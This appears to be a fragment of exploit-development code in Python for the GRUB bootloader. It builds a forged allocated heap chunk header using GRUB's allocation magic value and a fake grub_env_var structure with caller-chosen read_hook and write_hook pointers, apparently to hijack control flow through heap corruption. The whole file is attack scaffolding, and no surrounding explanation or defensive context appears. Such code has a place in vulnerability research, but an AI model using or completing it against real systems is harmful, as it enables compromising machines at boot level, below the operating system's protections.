import struct

ALLOC_MAGIC = 0x6db08fa4


def grub_mm_header_t(size):
    """
    create an allocated header
    """
    controlled = b''
    # Chunk header
    # the next value does not matter for allocated blocks, which will be fixed
    # when free'd
    controlled += struct.pack('<Q', 0x41424344)
    controlled += struct.pack('<Q', size)
    controlled += struct.pack('<Q', ALLOC_MAGIC)
    # padding
    controlled += b'Y'*8
    return controlled


def grub_env_var(str_address=0, read_hook=0, write_hook=0):
    """
    generate a grub_env_var struct
    """
    controlled = b''
    controlled += struct.pack('<Q', str_address)
    # -> value
    controlled += struct.pack('<Q', 0)
    # -> read_hook
    controlled += struct.pack('<Q', read_hook)
    # -> write_hook
    controlled += struct.pack('<Q', write_hook)
    # -> next
    controlled += struct.pack('<Q', 0)
    # -> prevp
    controlled += struct.pack('<Q', 0)
    # -> sorted_next
    controlled += struct.pack('<Q', 0)
    # -> global
    controlled += struct.pack('<Q', 0)
    # padding
    controlled += struct.pack('<Q', 0)
    return controlled
